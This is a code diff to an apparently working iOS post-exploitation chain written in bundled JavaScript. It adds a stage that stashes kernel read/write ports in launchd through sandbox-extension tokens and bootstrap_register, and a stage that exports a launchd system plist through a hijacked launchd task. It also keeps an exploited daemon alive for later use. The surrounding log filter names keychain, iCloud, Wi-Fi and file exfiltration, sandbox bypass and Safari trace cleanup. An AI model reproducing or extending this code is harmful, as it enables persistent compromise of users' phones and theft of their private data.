+				throw new Error("fileport_makeport failed");
+			}
+			krw_persist_log("handoff-fileports-created", "control_port=" + rwContext.controlPort +
+				" rw_port=" + rwContext.rwPort + " control_result=" + rwContext.controlMakePortResult +
+				" rw_result=" + rwContext.rwMakePortResult);
+
+		let registerClass = mpd_krw_mach_register_class();
+		let lookupClass = mpd_krw_mach_lookup_class();
+			controlRegisterToken = krwStashIssueMachToken(launchdTask, registerClass, controlName);
+			rwRegisterToken = krwStashIssueMachToken(launchdTask, registerClass, rwName);
+			if (!controlRegisterToken || !rwRegisterToken) throw new Error("mach-register token issue failed");
+			krw_persist_log("handoff-register-tokens-issued", "control_len=" + controlRegisterToken.length +
+				" rw_len=" + rwRegisterToken.length);
+			if (!krwStashConsumeToken(controlRegisterToken)) throw new Error("control mach-register token consume failed");
+			if (!krwStashConsumeToken(rwRegisterToken)) throw new Error("rw mach-register token consume failed");
+			krw_persist_log("handoff-register-tokens-consumed");
+
+			bootstrapPort = krwStashBootstrapPort();
+			if (!bootstrapPort) throw new Error("task_get_special_port bootstrap lookup failed");
+			krw_persist_log("handoff-bootstrap-ready", "bootstrap_port=" + bootstrapPort);
+			let ret = Native.callSymbol("bootstrap_register", bootstrapPort, controlName, rwContext.controlPort);
+			if (Number(ret) !== 0) throw new Error("control bootstrap_register failed: " + ret);
+			registeredControl = true;
+			ret = Native.callSymbol("bootstrap_register", bootstrapPort, rwName, rwContext.rwPort);
+			if (Number(ret) !== 0) throw new Error("rw bootstrap_register failed: " + ret);
+			registeredRW = true;
+			krw_persist_log("handoff-services-registered", "control=1 rw=1");
+
+			let controlLookupToken = krwStashIssueMachToken(launchdTask, lookupClass, controlName);
+			let rwLookupToken = krwStashIssueMachToken(launchdTask, lookupClass, rwName);
+			if (!controlLookupToken || !rwLookupToken) throw new Error("mach-lookup token issue failed");
+			krw_persist_log("handoff-lookup-tokens-issued", "control_len=" + controlLookupToken.length +
+				" rw_len=" + rwLookupToken.length);
+			if (!krwStashConsumeToken(controlLookupToken)) throw new Error("control mach-lookup token consume failed");
+			if (!krwStashConsumeToken(rwLookupToken)) throw new Error("rw mach-lookup token consume failed");
+			krw_persist_log("handoff-lookup-tokens-consumed");
+
+			controlLookupPort = krwStashLookup(bootstrapPort, controlName);
+			rwLookupPort = krwStashLookup(bootstrapPort, rwName);
+			if (!controlLookupPort || !rwLookupPort) throw new Error("bootstrap_look_up verification failed");
+			krw_persist_log("handoff-services-resolved", "control_port=" + controlLookupPort +
+				" rw_port=" + rwLookupPort);
+			controlProbeFd = Native.callSymbol("fileport_makefd", controlLookupPort);
+			rwProbeFd = Native.callSymbol("fileport_makefd", rwLookupPort);
+			if (!krwStashFdValid(controlProbeFd) || !krwStashFdValid(rwProbeFd)) {
+				throw new Error("fileport_makefd verification failed");
+			}
+			krw_persist_log("handoff-probe-fds-created", "control_fd=" + controlProbeFd + " rw_fd=" + rwProbeFd);
+			let kernelBase = mpd_kernel_base();
+			if (!mpd_krw_probe_pair(BigInt(controlProbeFd), BigInt(rwProbeFd), kernelBase)) {
+				throw new Error("kernel magic verification failed");
+			}
+			krw_persist_log("handoff-probe-passed", "kernel_base=" + krwStashHex(kernelBase));
+
+		let record = {
+			version: mpd_krw_stash_version(),
+			scheme: mpd_krw_stash_scheme(),
+			bootId: identity.bootId,
+			model: identity.model,
+			build: identity.build,
+			kernelBase: krwStashHex(kernelBase),
+			kernelSlide: krwStashHex(mpd_kernel_slide()),
+			controlName: controlName,
+			rwName: rwName,
+			controlLookupToken: controlLookupToken,
+			rwLookupToken: rwLookupToken,
+			controlRegisterToken: controlRegisterToken,
+			rwRegisterToken: rwRegisterToken
+		};
+		if (!mpd_krw_write_stash_record(record)) throw new Error("record write failed");
+			mpd_krw_mark_stash_verified();
+			success = true;
+			LOG("[KRW-STASH] launchd handoff verified for " + identity.model + " " + identity.build);
+			krw_persist_log("handoff-verified", "model=" + identity.model + " build=" + identity.build);
+			return true;
+		} catch (e) {
+			LOG("[KRW-STASH] handoff failed; current KRW remains active: " + String(e));
+			krw_persist_log("handoff-failed", "error=" + String(e));
+			return false;
+	} finally {
+		if (krwStashFdValid(controlProbeFd)) try { Native.callSymbol("close", controlProbeFd); } catch (_) {}
+		if (krwStashFdValid(rwProbeFd)) try { Native.callSymbol("close", rwProbeFd); } catch (_) {}
+		krwStashDeallocatePort(controlLookupPort);
+		krwStashDeallocatePort(rwLookupPort);
+		if (!success) {
+			if (registeredRW) krwStashUnregister(bootstrapPort, rwName);
+			if (registeredControl) krwStashUnregister(bootstrapPort, controlName);
+		}
+			if (rwContext) {
+				krwStashDeallocatePort(rwContext.controlPort);
+				krwStashDeallocatePort(rwContext.rwPort);
+			}
+			krw_persist_log("handoff-local-cleanup", "success=" + (success ? "1" : "0") +
+				" registered_control=" + (registeredControl ? "1" : "0") +
+				" registered_rw=" + (registeredRW ? "1" : "0"));
+		}
+	}
 
 let chainStatusLogReady = false;
 let chainStatusBuffer = [];
 let chainStatusLastLine = "";
-const CHAIN_STATUS_FILTER_RE = /\[PE\]|\[PE-DBG\]|\[SBX1\]|\[SBC\]|\[POWERCUFF\]|\[FILE-DL\]|\[FILE-DL-EARLY\]|\[HTTP-UPLOAD\]|\[APP\]|\[ICLOUD\]|\[KEYCHAIN\]|\[WIFI\]|\[THREEAPP\]|\[THREEAPP-AUDIT\]|\[SAFARI-CLEAN\]|\[MG\]|\[MPD\]|\[APPLIMIT\]|nativeCallBuff|kernel_base|kernel_slide|SBX0|SBX1|sbx0:|sbx1:|MIG_FILTER_BYPASS |INJECTJS |CHAIN |DRIVER-POSTEXPL |DRIVER-NEWTHREAD |DARKSWORD-WIFI-DUMP |INFO |OFFSETS |FILE-UTILS |PORTRIGHTINSERTER |REGISTERSSTRUCT |REMOTECALL |TASK(?:ROP)? |THREAD |VM |MAIN |EXCEPTION |SANDBOX |PAC (?:diagnostics|ptrs|gadget)|UTILS |^\[[+\-!i]\]\s/i;
+const CHAIN_STATUS_FILTER_RE = /\[PE(?:-[A-Z0-9]+)*\]|\[KRW(?:-[A-Z0-9]+)*\]|\[OTA-EXPORT\]|\[SBX1\]|\[SBC\]|\[POWERCUFF\]|\[FILE-DL\]|\[FILE-DL-EARLY\]|\[HTTP-UPLOAD\]|\[APP\]|\[ICLOUD\]|\[KEYCHAIN\]|\[WIFI\]|\[THREEAPP\]|\[THREEAPP-AUDIT\]|\[SAFARI-CLEAN\]|\[MG\]|\[MPD\]|\[APPLIMIT\]|nativeCallBuff|kernel_base|kernel_slide|SBX0|SBX1|sbx0:|sbx1:|MIG_FILTER_BYPASS |INJECTJS |CHAIN |DRIVER-POSTEXPL |DRIVER-NEWTHREAD |DARKSWORD-WIFI-DUMP |INFO |OFFSETS |FILE-UTILS |PORTRIGHTINSERTER |REGISTERSSTRUCT |REMOTECALL |TASK(?:ROP)? |THREAD |VM |MAIN |EXCEPTION |SANDBOX |PAC (?:diagnostics|ptrs|gadget)|UTILS |^\[[+\-!i]\]\s/i;
 const chainStatusOriginalLog = LOG;
 LOG = function(msg) {
 	try { chainStatusRecord(msg); } catch (_) {}
@@ -9198,6 +10250,180 @@ function runOptionalStage(label, enabled, fn) {
 	} catch (e) {
 		LOG("[PE] " + label + " exception: " + String(e));
 		return false;
+	}
+}
+
+function exportOriginalOTADisabledPlist(launchdTask) {
+	const Native = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"];
+	const Sandbox = libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"];
+	const sourcePath = "/private/var/db/com.apple.xpc.launchd/disabled.plist";
+	const destinationDir = "/private/var/mobile/Media/Downloads/";
+	const destinationPath = destinationDir + "disabled.plist.original";
+	const maxFileSize = 4 * 1024 * 1024;
+	let sourceFd = -1;
+	let sourceBuffer = 0n;
+	let verifyBuffer = 0n;
+	let remoteBuffer = 0n;
+	let remoteDestinationFd = -1;
+	let remoteVerifyFd = -1;
+
+	function getErrno() {
+		let errnoPtr = Native.callSymbol("__error");
+		return errnoPtr ? Native.read32(BigInt(errnoPtr)) : -1;
+	}
+
+	function consumeToken(path, label) {
+		// The standard helper path avoids the optional remote strlcpy copy.
+		let token = Sandbox.getTokenForPath(path, false);
+		if (!token) {
+			LOG("[OTA-EXPORT] result=token-failed target=" + label + " path=" + path + " bytes=0");
+			return false;
+		}
+		let ret = Native.callSymbol("sandbox_extension_consume", token);
+		let ok = Number(ret) >= 0;
+		LOG("[OTA-EXPORT] sandbox-token target=" + label + " result=" + (ok ? "consumed" : "failed") + " ret=" + ret + " path=" + path);
+		return ok;
+	}
+
+	function readFully(fd, buffer, size) {
+		let total = 0;
+		while (total < size) {
+			let amount = Number(Native.callSymbol("read", fd, buffer + BigInt(total), BigInt(size - total)));
+			if (amount <= 0) break;
+			total += amount;
+		}
+		return total;
+	}
+
+	LOG("[OTA-EXPORT] source=" + sourcePath);
+	LOG("[OTA-EXPORT] destination=" + destinationPath);
+
+	try {
+		// Prefer a narrow launchd-issued extension. Sandbox.createTokens() has
+		// already attempted the normal process-wide root and Media grants, so a
+		// duplicate token failure is not by itself an access failure.
+		let sourceTokenPath = "/private/var/db/com.apple.xpc.launchd/";
+		if (!consumeToken(sourceTokenPath, "source-directory")) {
+			LOG("[OTA-EXPORT] source token unavailable; trying existing sandbox access");
+		}
+
+		// The source descriptor is always O_RDONLY. No source mutation call uses sourcePath.
+		sourceFd = Native.callSymbol("open", sourcePath, 0n);
+		if (Number(sourceFd) < 0) {
+			let openErrno = getErrno();
+			LOG("[OTA-EXPORT] result=" + (openErrno === 2 ? "missing" : "source-open-failed") + " errno=" + openErrno + " bytes=0 source=" + sourcePath + " destination=" + destinationPath);
+			return false;
+		}
+
+		let fileSize = Number(Native.callSymbol("lseek", sourceFd, 0n, 2n));
+		if (fileSize < 0) {
+			LOG("[OTA-EXPORT] result=source-size-failed errno=" + getErrno() + " bytes=0 source=" + sourcePath + " destination=" + destinationPath);
+			return false;
+		}
+		if (fileSize === 0) {
+			LOG("[OTA-EXPORT] result=empty bytes=0 source=" + sourcePath + " destination=" + destinationPath);
+			return false;
+		}
+		if (fileSize > maxFileSize) {
+			LOG("[OTA-EXPORT] result=source-too-large bytes=" + fileSize + " limit=" + maxFileSize + " source=" + sourcePath + " destination=" + destinationPath);
+			return false;
+		}
+		if (Number(Native.callSymbol("lseek", sourceFd, 0n, 0n)) !== 0) {
+			LOG("[OTA-EXPORT] result=source-seek-failed errno=" + getErrno() + " bytes=0 source=" + sourcePath + " destination=" + destinationPath);
+			return false;
+		}
+
+		sourceBuffer = Native.callSymbol("malloc", BigInt(fileSize));
+		if (!sourceBuffer || sourceBuffer === 0n) {
+			LOG("[OTA-EXPORT] result=source-buffer-failed bytes=0 source=" + sourcePath + " destination=" + destinationPath);
+			return false;
+		}
+		let bytesRead = readFully(sourceFd, BigInt(sourceBuffer), fileSize);
+		Native.callSymbol("close", sourceFd);
+		sourceFd = -1;
+		if (bytesRead !== fileSize) {
+			LOG("[OTA-EXPORT] result=short-read bytes=" + bytesRead + " expected=" + fileSize + " errno=" + getErrno() + " source=" + sourcePath + " destination=" + destinationPath);
+			return false;
+		}
+
+		if (!launchdTask || !launchdTask.success()) {
+			LOG("[OTA-EXPORT] result=launchd-task-unavailable bytes=0 source=" + sourcePath + " destination=" + destinationPath);
+			return false;
+		}
+
+		remoteBuffer = launchdTask.call(10, "malloc", BigInt(fileSize));
+		if (!remoteBuffer || !launchdTask.write(remoteBuffer, sourceBuffer, fileSize)) {
+			LOG("[OTA-EXPORT] result=launchd-buffer-failed bytes=0 source=" + sourcePath + " destination=" + destinationPath);
+			return false;
+		}
+		let remoteMem = launchdTask.mem();
+		if (!launchdTask.writeStr(remoteMem, destinationPath)) {
+			LOG("[OTA-EXPORT] result=destination-path-write-failed bytes=0 source=" + sourcePath + " destination=" + destinationPath);
+			return false;
+		}
+
+		// launchd supplies destination permissions only. O_NOFOLLOW prevents an
+		// existing destination symlink from redirecting the write.
+		remoteDestinationFd = launchdTask.call(10, "open", remoteMem, 0x701n, 0o644n);
+		if (Number(remoteDestinationFd) < 0) {
+			LOG("[OTA-EXPORT] result=destination-open-failed context=launchd bytes=0 source=" + sourcePath + " destination=" + destinationPath);
+			return false;
+		}
+		let bytesWritten = 0;
+		while (bytesWritten < fileSize) {
+			let chunkSize = Math.min(fileSize - bytesWritten, 32768);
+			let amount = Number(launchdTask.call(10, "write", remoteDestinationFd, remoteBuffer + BigInt(bytesWritten), BigInt(chunkSize)));
+			if (amount <= 0) break;
+			bytesWritten += amount;
+		}
+		if (bytesWritten === fileSize) launchdTask.call(10, "fsync", remoteDestinationFd);
+		launchdTask.call(10, "close", remoteDestinationFd);
+		remoteDestinationFd = -1;
+		if (bytesWritten !== fileSize) {
+			LOG("[OTA-EXPORT] result=short-write context=launchd bytes=" + bytesWritten + " expected=" + fileSize + " source=" + sourcePath + " destination=" + destinationPath);
+			return false;
+		}
+
+		remoteVerifyFd = launchdTask.call(10, "open", remoteMem, 0n);
+		if (Number(remoteVerifyFd) < 0) {
+			LOG("[OTA-EXPORT] result=verify-open-failed context=launchd bytes=" + bytesWritten + " source=" + sourcePath + " destination=" + destinationPath);
+			return false;
+		}
+		let destinationSize = Number(launchdTask.call(10, "lseek", remoteVerifyFd, 0n, 2n));
+		if (destinationSize !== fileSize || Number(launchdTask.call(10, "lseek", remoteVerifyFd, 0n, 0n)) !== 0) {
+			LOG("[OTA-EXPORT] result=verify-size-failed bytes=" + destinationSize + " expected=" + fileSize + " source=" + sourcePath + " destination=" + destinationPath);
+			return false;
+		}
+		verifyBuffer = Native.callSymbol("malloc", BigInt(fileSize));
+		if (!verifyBuffer || verifyBuffer === 0n) {
+			LOG("[OTA-EXPORT] result=verify-buffer-failed bytes=" + bytesWritten + " source=" + sourcePath + " destination=" + destinationPath);
+			return false;
+		}
+		let verifiedBytes = 0;
+		while (verifiedBytes < fileSize) {
+			let chunkSize = Math.min(fileSize - verifiedBytes, 32768);
+			let amount = Number(launchdTask.call(10, "read", remoteVerifyFd, remoteBuffer + BigInt(verifiedBytes), BigInt(chunkSize)));
+			if (amount <= 0) break;
+			verifiedBytes += amount;
+		}
+		let copiedBack = verifiedBytes === fileSize && launchdTask.read(remoteBuffer, verifyBuffer, fileSize);
+		let compareResult = copiedBack ? Number(Native.callSymbol("memcmp", sourceBuffer, verifyBuffer, BigInt(fileSize))) : -1;
+		if (verifiedBytes !== fileSize || compareResult !== 0) {
+			LOG("[OTA-EXPORT] result=verify-content-failed bytes=" + verifiedBytes + " expected=" + fileSize + " compare=" + compareResult + " source=" + sourcePath + " destination=" + destinationPath);
+			return false;
+		}
+		LOG("[OTA-EXPORT] result=success bytes=" + fileSize + " source=" + sourcePath + " destination=" + destinationPath);
+		return true;
+	} catch (e) {
+		LOG("[OTA-EXPORT] result=exception bytes=0 error=" + String(e) + " source=" + sourcePath + " destination=" + destinationPath);
+		return false;
+	} finally {
+		if (Number(sourceFd) >= 0) Native.callSymbol("close", sourceFd);
+		if (Number(remoteDestinationFd) >= 0 && launchdTask) launchdTask.call(10, "close", remoteDestinationFd);
+		if (Number(remoteVerifyFd) >= 0 && launchdTask) launchdTask.call(10, "close", remoteVerifyFd);
+		if (remoteBuffer && remoteBuffer !== 0n && launchdTask) launchdTask.call(10, "free", remoteBuffer);
+		if (sourceBuffer && sourceBuffer !== 0n) Native.callSymbol("free", sourceBuffer);
+		if (verifyBuffer && verifyBuffer !== 0n) Native.callSymbol("free", verifyBuffer);
 	}
 }
 
@@ -10162,6 +11388,14 @@ function start() {
 		try { krw_terminal_cleanup("launchd RemoteCall failure"); } catch (e) { LOG("[KRW-CLEAN] terminal cleanup threw: " + String(e)); }
 		return false;
 	}
+	phaseStart("KRW stash");
+	try {
+		let stashResult = stashKRWToLaunchd(launchdTask);
+		LOG("[KRW-STASH] stage result=" + (stashResult ? "success" : "not saved"));
+	} catch (e) {
+		LOG("[KRW-STASH] stage exception; continuing: " + String(e));
+	}
+	phaseEnd("KRW stash");
 	try {
 
 	phaseStart("Sandbox setup");
@@ -10179,10 +11413,12 @@ function start() {
 	libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("mkdir", "/private/var/mobile/Media/Downloads", 0o777n);
 	libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("chmod", "/private/var/mobile/Media/Downloads", 0o777n);
 	LOG("[PE] Exfil dir: " + filzaDst);
-	LOG("[PE] Chain status overlay log: " + CHAIN_STATUS_LOG_PATH);
-	phaseEnd("Media dir prep");
+		LOG("[PE] Chain status overlay log: " + CHAIN_STATUS_LOG_PATH);
+		phaseEnd("Media dir prep");
+		let otaExportResult = runOptionalStage("OTA disabled.plist read-only export", ENABLE_OTA_DISABLED_EXPORT, () => exportOriginalOTADisabledPlist(launchdTask));
+		if (ENABLE_OTA_DISABLED_EXPORT) LOG("[PE] OTA disabled.plist read-only export result=" + (otaExportResult ? "success" : "failed"));
 
-	phaseStart("Safari clean+kill");
+		phaseStart("Safari clean+kill");
 	let safariCleanOk = runOptionalStage("Safari origin cleanup audit", ENABLE_SAFARI_ORIGIN_AUDIT, auditSafariOriginData);
 	if (safariCleanOk && ENABLE_SAFARI_KILL_AFTER_CLEAN) {
 		runOptionalStage("Safari app termination", true, () => terminateSafariAfterClean(launchdTask));
@@ -11148,14 +12384,25 @@ function start() {
 		LOG("[THREEAPP] 3-App Bypass disabled");
 	}
 	} finally {
+		krw_persist_log("post-stage-cleanup-start");
 		LOG("[PE] Cleaning up launchdTask...");
-		try { launchdTask.destroy(); } catch (e) { LOG("[PE] launchdTask.destroy failed: " + String(e)); }
+		try {
+			launchdTask.destroy();
+			krw_persist_log("launchd-task-destroy-done");
+		} catch (e) {
+			LOG("[PE] launchdTask.destroy failed: " + String(e));
+			krw_persist_log("launchd-task-destroy-failed", "error=" + String(e));
+		}
 		if (migFilterBypass) {
+			krw_persist_log("mig-filter-stop-start");
 			LOG("[PE] Stopping MigFilterBypass...");
 			migFilterBypass.stop();
 			globalThis.__ls_active_mig_filter_bypass = null;
+			krw_persist_log("mig-filter-stop-done");
 		}
+		krw_persist_log("post-stage-cleanup-before-terminal");
 		try { krw_terminal_cleanup("post-exploitation teardown"); } catch (e) { LOG("[KRW-CLEAN] terminal cleanup threw: " + String(e)); }
+		krw_persist_log("post-stage-cleanup-done");
 	}
 	LOG("[PE] start() completed successfully");
 
@@ -11178,7 +12425,21 @@ finally {
 		}
 	} catch (e) { LOG("[PE] active MigFilterBypass stop threw: " + String(e)); }
 	try { krw_terminal_cleanup("bundle finalizer"); } catch (e) { LOG("[KRW-CLEAN] terminal cleanup threw: " + String(e)); }
-	libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("exit", 0n);
+		if (krw_provider_hold_active || krw_socket_pin_active || krw_restore_snapshot_valid) {
+			krw_persist_log("bundle-finalizer", "action=keep-alive");
+			LOG("[KRW-HOLD] bundle finalizer left mediaplaybackd alive; hold=" +
+				(krw_provider_hold_active ? "active" : "unavailable") +
+				" stash=" + (krw_stash_verified ? "verified" : "unverified"));
+	} else if (a18_cleanup_unsafe) {
+		krw_persist_log("bundle-finalizer", "action=keep-alive reason=unsafe-a18-state");
+		LOG("[PE-A18] bundle finalizer left mediaplaybackd alive; manual reboot required");
+	} else if (LS_RETAIN_KRW_FOR_VISIBLE_TEST && retained_socket_ports.length > 0) {
+		krw_persist_log("bundle-finalizer", "action=keep-alive reason=visible-test");
+		LOG("[PE-TEST] bundle finalizer left mediaplaybackd alive");
+	} else {
+		krw_persist_log("bundle-finalizer", "action=exit");
+		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("exit", 0n);
+	}
 }
 
 })();
@@ -11188,9 +12449,21 @@ finally {
   } catch (error) {
 	  LOG(`Main function resulted with an error: ${error}`);
 	  LOG("stack: " + error.stack);
-  } finally {
-	  // Post-Exp done.
-	  // Exiting the process.
-	  exit(0n);
+	  } finally {
+		  if (krw_provider_hold_active || krw_socket_pin_active || krw_restore_snapshot_valid) {
+			  krw_persist_log("post-wrapper-finalizer", "action=keep-alive");
+			  LOG("[KRW-HOLD] post-exploitation wrapper left mediaplaybackd alive; hold=" +
+				  (krw_provider_hold_active ? "active" : "unavailable") +
+				  " stash=" + (krw_stash_verified ? "verified" : "unverified"));
+	  } else if (a18_cleanup_unsafe) {
+		  krw_persist_log("post-wrapper-finalizer", "action=keep-alive reason=unsafe-a18-state");
+		  LOG("[PE-A18] post-exploitation wrapper left mediaplaybackd alive; manual reboot required");
+	  } else if (LS_RETAIN_KRW_FOR_VISIBLE_TEST && retained_socket_ports.length > 0) {
+		  krw_persist_log("post-wrapper-finalizer", "action=keep-alive reason=visible-test");
+		  LOG("[PE-TEST] post-exploitation wrapper left mediaplaybackd alive");
+	  } else {
+		  krw_persist_log("post-wrapper-finalizer", "action=exit");
+		  exit(0n);
+	  }
   }
 })();
